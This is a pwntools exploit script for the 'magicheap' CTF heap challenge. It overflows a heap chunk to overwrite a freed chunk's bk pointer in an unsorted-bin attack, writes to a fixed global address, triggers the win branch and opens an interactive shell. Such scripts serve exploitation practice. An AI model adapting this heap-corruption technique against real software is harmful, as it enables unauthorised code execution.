#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./magicheap1')
libc = ELF('libc.so.6')
p=process('./magicheap1')
# p = remote('node4.buuoj.cn', '28467')

def create(size, content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap:')
    p.sendline(content)

def edit(index, size, content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap : ')
    p.sendline(content)

def delete(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

magic_addr = 0x6020C0

create(0x18,'123')# 0
create(0x80,'123')# 1
create(0x80,'123')# 2

delete(1)

payload = 0x18*b'a' + p64(0x91) + p64(0) + p64(magic_addr-0x10)
edit(0,0x30, payload)

create(0x80,'123')

p.recvuntil('Your choice :')
p.sendline(str(4869))

p.interactive()
